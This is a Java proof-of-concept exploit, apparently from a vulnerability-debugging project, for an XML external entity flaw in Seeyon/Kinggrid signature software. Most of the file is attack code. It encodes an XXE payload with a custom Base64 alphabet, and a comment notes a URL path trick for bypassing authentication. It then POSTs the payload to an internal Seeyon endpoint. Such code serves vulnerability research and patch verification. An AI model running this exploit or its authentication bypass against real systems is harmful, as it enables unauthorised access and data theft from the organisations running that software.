package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import utils.Base64Util;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;


/**
 * 漏洞名称：金格xml外部实体注入漏洞
 * 漏洞通告：http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=170
 */
public class XXE_20230810 {

    public static String decode(String str) throws UnsupportedEncodingException {

        String output;
        output = URLDecoder.decode(str);
        output = Base64Util.decodeString(output, "UTF-8", "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=");

        return output;
    }

    public static String encode(String str){

        String output;
        output = Base64Util.encode(str.getBytes(), "UTF-8", "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=");
        output = URLEncoder.encode(output);

        return output;
    }

    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201/seeyon/m-signature/RunSignature/run/getAjaxDataServlet?S=ajaxEdocSummaryManager&M=deleteUpdateObj";
        //配合/getAjaxDataServlet接口绕过鉴权
        String url2 = "http://10.58.120.201/seeyon/m-signature/RunSignature/run";
        String url3 = "http://10.58.120.201/seeyon/getAjaxDataServlet?S=ajaxEdocSummaryManager&M=deleteUpdateObj";


         String imgvalue = "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=";
        String xmlValue = "<!DOCTYPE ANY [<!ENTITY name SYSTEM \"http://127.0.0.1:9999/success_xxe\" >]><name>&name;</name>";
        String body = "encode=true" + "&imgvalue=" + encode(imgvalue) + "&xmlValue=" + encode(xmlValue);//payload编码版
        String body2 = "imgvalue=" + imgvalue + "&xmlValue=" + URLEncoder.encode(xmlValue);//payload不编码版

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendStringPost(httpPost, body2);

    }
}
